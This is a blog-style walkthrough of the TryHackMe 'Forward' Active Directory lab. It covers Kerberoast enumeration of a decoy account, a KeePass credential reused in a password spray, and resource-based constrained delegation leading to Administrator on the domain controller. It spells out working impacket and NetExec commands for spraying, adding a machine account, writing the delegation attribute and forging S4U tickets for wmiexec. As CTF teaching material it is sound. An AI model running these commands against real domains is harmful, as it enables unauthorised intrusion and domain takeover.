---
title: "TryHackMe Forward: Kerberoast Red Herring to RBCD"
date: 2026-09-30T12:52:00+05:30
lastmod: 2026-09-30T12:52:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-forward/00-thumbnail.png

categories:
  - TryHackMe

tags:
  - tryhackme
  - thm
  - rooms
  - Active Directory
  - AD Security Testing Basics
  - Jr Penetration Tester
  - RBCD
  - S4U2Proxy
  - Kerberos
  - Kerberoasting
  - password spraying
  - KeePass
  - NetExec
  - impacket

draft: false
description: "TryHackMe Forward walkthrough: a Kerberoastable red herring, a KeePass credential reused across accounts, and resource-based constrained delegation to Administrator."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y|
|---|---|
|Forward |![Forward room icon](https://cdn-images.tryhackme.com/room-icons/25835056d9d51fa07b52746e12805d751526267a80170bea31216cc90967a423.63c131e50a24c3005eb34678-1779248462763)|

**Forward** is the second challenge box in the Active Directory Security Testing Basics module, alongside [Proxy](/post/thm-room-proxychallenge/). One task, one question, and an assumed breach: the room hands you `ctf.local\j.smith : JSmith@IT2024` and asks for the Administrator flag.

The honest summary first: I found the wrong path, followed it a long way, and needed a public writeup to get unstuck. That wrong path is deliberate, and it is the most instructive part of the room, so it stays in.

The target is a single domain controller, `DC01.ctf.local`.

## Enumeration as j.smith

The starting credential works over SMB straight away. Share listing and RID brute give the shape of the domain:

```bash
nxc smb <dc> -u j.smith -p 'JSmith@IT2024' --shares
nxc smb <dc> -u j.smith -p 'JSmith@IT2024' --rid-brute 5000
```

Shares are thin: `Downloads` (READ, and empty), `NETLOGON` (empty), `SYSVOL`, `IPC$`. No GPP `cpassword` anywhere in SYSVOL. Accounts are `Administrator`, `Guest`, `krbtgt`, `DC01$`, `j.smith`, `l.jones`, `r.williams` and `svc.helpdesk`.

Nothing is AS-REP roastable. But one LDAP query lights up:

```bash
nxc ldap <dc> -u j.smith -p 'JSmith@IT2024' --find-delegation
  # svc.helpdesk  Person  Constrained w/ Protocol Transition
GetUserSPNs.py -dc-ip <dc> 'ctf.local/j.smith:JSmith@IT2024'
  # helpdesk/DC01  and  helpdesk/DC01.ctf.local  ->  svc.helpdesk
```

A Kerberoastable service account that also carries constrained delegation with protocol transition. Having just finished Proxy, where exactly that combination is the win condition, I read this as the answer and went at it hard.

## The red herring

It is not the answer. `svc.helpdesk` is a decoy, and the room lets you spend as long as you like on it.

I requested the TGS and threw the obvious things at it: plain rockyou, rockyou with `best64` rules, and then thirteen targeted candidates modelled on the room's own password style, since `JSmith@IT2024` telegraphs a `<Word>@IT<year>` convention (`Helpdesk@IT2024`, `SvcHelpdesk@IT2024`, `HelpDesk@2024`, and so on). Nothing cracked.

I also checked whether j.smith could simply rewrite the account instead of cracking it:

```bash
dacledit.py -action read -principal j.smith -target svc.helpdesk -dc-ip <dc> 'ctf.local/j.smith:...'
```

No ACEs for j.smith over `svc.helpdesk`, `l.jones`, `r.williams` or `Administrator`. So no ForceChangePassword or GenericWrite shortcut either.

At that point I was stuck, and I read the public writeups. The real chain runs through the filesystem, not Kerberos.

{{< ad >}}

## The real path: KeePass, then reuse

`j.smith` is a member of Remote Desktop Users, so you can RDP straight into the DC. In that user's Documents sits a `Database.kdbx`, and the KeePass database is configured to authenticate with the **current Windows user account** rather than a master password. As j.smith you just open it, and it yields `t.jones : Helpdesk01!`.

Since the hint had already given me the password, I skipped the RDP hop and went straight to the thing that actually matters, which is that the password is reused:

```bash
nxc smb <dc> -u users.txt -p 'Helpdesk01!' --continue-on-success
  # [+] ctf.local\t.jones:Helpdesk01!
  # [+] ctf.local\r.williams:Helpdesk01!
  # [+] ctf.local\l.jones:Helpdesk01! (Guest)
```

Two live hits. Note the third: `l.jones` shows `[+]` but is annotated `(Guest)`, which means the account is disabled and the session was downgraded to the Guest token. That marker is the difference between a credential and a dead end, and it is easy to skim past.

`r.williams` is the one that matters. It sits in a custom `sysadmin` group with write access over the domain controller's computer object, which is exactly the precondition for resource-based constrained delegation.

## RBCD to Administrator

Unlike classic constrained delegation, which needs `SeEnableDelegationPrivilege` on a DC to configure, RBCD moves the decision to the *target* object's security descriptor. Anyone with write rights over `DC01$` can nominate a principal allowed to act on its behalf. `ms-DS-MachineAccountQuota` is at the default 10, so we can supply that principal ourselves:

```bash
addcomputer.py -computer-name 'ATTACKSYS$' -computer-pass 'Summer2018!' \
  -dc-host DC01 -domain-netbios ctf.local 'ctf.local/r.williams:Helpdesk01!'

rbcd.py -dc-ip <dc> -delegate-from 'ATTACKSYS$' -delegate-to 'DC01$' \
  -action write 'ctf.local/r.williams:Helpdesk01!'
  # [*] ATTACKSYS$ can now impersonate users on DC01$ via S4U2Proxy
```

From there it is the standard S4U pair, impersonating Administrator to a CIFS service on the DC:

```bash
getST.py -spn 'cifs/DC01.ctf.local' -impersonate Administrator \
  -dc-ip <dc> 'ctf.local/ATTACKSYS$:Summer2018!'
export KRB5CCNAME=/root/fw/Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
wmiexec.py -k -no-pass ctf.local/Administrator@DC01.ctf.local \
  "cmd /c type C:\Users\Administrator\Desktop\flag.txt"
```

![Impacket getST requesting S4U2Self and S4U2Proxy as the attacker computer account, then wmiexec using the ticket to print the flag from the Administrator Desktop on DC01](/img/thm-forward/01-getst-rbcd-flag.png)

The flag is **THM{RBCD_S4U2Pr0xy_T1ck3t_Th3ft_2_DA}**. Add `dc01.ctf.local` to `/etc/hosts` before any of the Kerberos steps, since none of it authenticates against a bare IP.

## Things that went wrong

Two operational notes worth more than the flag.

I knocked the lab machine over twice with `nmap -Pn -T4 -p- --min-rate 2000`. Both times every port went to 100% packet loss while the AttackBox still had working internet, and the fix was a terminate and redeploy. These single-DC lab images do not survive an aggressive full scan; a top-ports pass at default timing tells you everything you need here anyway.

I also lost a solid ten minutes to a stale `/etc/hosts`. The entry for `ctf.local` still pointed at the previous room's DC, so `GetUserSPNs.py -request` failed with `[Errno 110] Connection timed out` while the non-Kerberos LDAP queries kept working perfectly. A Kerberos-only timeout next to healthy LDAP is almost always name resolution, not the target. Separately, `bloodhound-python` on the current AttackBox image crashes with `AttributeError: 'NoneType' object has no attribute 'extend'`, so the graph that would have shown me the `r.williams` path immediately was not available.

## Two takeaways

**A decoy that is technically exploitable is the most expensive kind.** `svc.helpdesk` was genuinely Kerberoastable and genuinely carried protocol transition. Every property I checked said "this is the path", and the only thing that said otherwise was an uncrackable hash. The signal I ignored is that a designed room gives you a crackable hash within the first wordlist; when rockyou plus rules plus targeted guesses all miss, the hash is probably not meant to fall, and that is information about the path rather than about my wordlist.

**Read the `(Guest)` annotation on every spray hit.** NetExec prints `[+]` for `l.jones:Helpdesk01!` and for `r.williams:Helpdesk01!`, but only one of those is a usable session. The disabled account is silently mapped to the Guest token, so a spray that looks like three wins is really two. Treating `[+] (Guest)` as success is how you end up debugging permissions on an account you never actually authenticated as.

Credit where due: the KeePass and spray steps came from the public writeups by [bonestorm](https://medium.com/@bonestorm/thm-forward-writeup-de7c54bdb6e8), [happycamper84](https://happycamper84.medium.com/tryhackme-forward-walkthrough-a0b8e31ccf47) and [musyokaian](https://musyokaian.medium.com/forward-tryhakme-challenge-15e05a0f532d), after the Kerberoast path stalled. The RBCD half I ran myself.

Room solved 100%: 1 task, 1 answer.
